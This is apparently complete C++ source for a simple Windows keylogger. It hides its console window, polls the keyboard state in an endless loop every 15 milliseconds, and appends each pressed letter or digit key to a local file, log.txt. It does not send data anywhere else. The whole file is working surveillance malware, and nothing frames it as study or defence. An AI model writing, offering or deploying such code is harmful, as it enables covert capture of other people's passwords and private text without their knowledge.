#include <windows.h>
#include <fstream>
#include <algorithm>

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::ofstream log;
    BYTE state[256];
    GetKeyboardState(state);
    BYTE tmp[256];
    while (true)
    {
        Sleep(15);
        std::copy(std::begin(state), std::end(state), std::begin(tmp));
        GetKeyState(0);
        GetKeyboardState(state);
        for (int i = 48; i <= 90; i++)
        {
            if ((int(tmp[i]) == 0 && int(state[i]) == 129) || ((int(tmp[i]) == 128 && int(state[i]) == 0)))
            {
                log.open("log.txt", std::ofstream::app);
                log << char(i) << "\n";
                log.close();
            }
        }
    }
    return 0;
}
